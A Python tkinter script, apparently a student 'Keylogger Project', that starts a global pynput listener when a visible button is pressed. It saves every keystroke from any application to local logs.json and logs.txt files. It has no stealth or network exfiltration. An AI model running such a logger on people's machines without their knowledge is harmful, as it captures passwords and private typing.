import tkinter as tk
from pynput import keyboard
import json
import threading  

root = tk.Tk()
root.geometry("300x200")
root.title("Keylogger Project")
root.configure(bg = "lavender")

key_list = []
typed_text = ""

def update_txt_file(text):
    with open('logs.txt', 'w') as file:
        file.write(text)

def update_json_file(key_list):
    with open('logs.json', 'w') as key_log:
        json.dump(key_list, key_log, indent=4)

def process_key(key):
    global typed_text

    try:
        typed_text += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            typed_text += " "
        elif key == keyboard.Key.enter:
            typed_text += "\n"
        elif key == keyboard.Key.backspace:
            typed_text = typed_text[:-1]
        else:
            return

    update_txt_file(typed_text)

    display_var.set(typed_text)

def on_press(key):
    key_list.append({'Pressed': str(key)})
    update_json_file(key_list)

def on_release(key):
    key_list.append({'Released': str(key)})
    update_json_file(key_list)
    process_key(key)

def start_keylogger():
    listener = keyboard.Listener(
        on_press=on_press,
        on_release=on_release
    )
    listener.start() 

def butaction():
    threading.Thread(target=start_keylogger).start()

display_var = tk.StringVar()

label = tk.Label(root, text="Keylogger", font=("Verdana", 16, "bold"))
label.pack(pady=10)

output_label = tk.Label(root, textvariable=display_var, wraplength=250)
output_label.pack(pady=10)

start_btn = tk.Button(root, text="Start Keylogger", command=butaction)
start_btn.pack(pady=10)

root.mainloop()
